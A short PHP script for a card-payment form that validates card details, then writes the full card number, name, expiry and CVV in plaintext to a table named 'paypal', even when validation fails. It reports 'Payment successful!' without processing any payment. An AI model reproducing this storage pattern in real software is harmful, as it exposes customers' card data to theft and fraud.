<?php
require('dbconnection.php');
// Initialize variables to store errors and form data
$errors = ['cardNumber' => '', 'nameOnCard' => '', 'expiration' => '', 'cvv' => ''];
$successMessage = '';

// Process form when submit button is pressed

    // Validation functions
    function validateCardNumber($cardNumber) {
        return preg_match('/^\d{16}$/', str_replace(' ', '', $cardNumber));
    }

    function validateExpiration($expiration) {
        return preg_match('/^(0[1-9]|1[0-2])\/(\d{2})$/', $expiration);
    }

    function validateCVV($cvv) {
        return preg_match('/^\d{3}$/', $cvv);
    }

    // Get and validate form inputs
    $cardNumber = $_POST['cardNumber'] ?? '';
    $nameOnCard = $_POST['nameOnCard'] ?? '';
    $expiration = $_POST['expiration'] ?? '';
    $cvv = $_POST['cvv'] ?? '';

    if (!validateCardNumber($cardNumber)) {
        $errors['cardNumber'] = "Please enter a valid card number.";
    }

    if (empty($nameOnCard)) {
        $errors['nameOnCard'] = "Name on card is required.";
    }

    if (!validateExpiration($expiration)) {
        $errors['expiration'] = "Please enter a valid expiration date (MM/YY).";
    }

    if (!validateCVV($cvv)) {
        $errors['cvv'] = "CVV must be exactly 3 digits.";
    }

    // If no errors, process payment (dummy success message for example)
    if (!array_filter($errors)) {
        $successMessage = "Payment successful!";
        // Here you would add code to process the payment
    }


    if(isset($_POST['submitBtn'])){
        $cardNumber = $_POST['cardNumber'];
        $nameOnCard = $_POST['nameOnCard'];
        $expiration = $_POST['expiration'];
        $cvv = $_POST['cvv'];
        
        $query = "INSERT INTO `paypal` (`card_number`, `name_on_card`, `expiration`, `cvv`) VALUES (:cardNumber, :nameOnCard, :expiration, :cvv)";
        $statement = $dbconnection->prepare($query);
        
        $data = [
            'cardNumber' => $cardNumber,
            'nameOnCard' => $nameOnCard,
            'expiration' => $expiration,
            'cvv' => $cvv,
        ];
        
        $statement->execute($data);
    }
    


?>

   
    <?php if ($successMessage): ?>
    <p style="color:green;"><?= $successMessage; ?></p>
<?php endif; ?>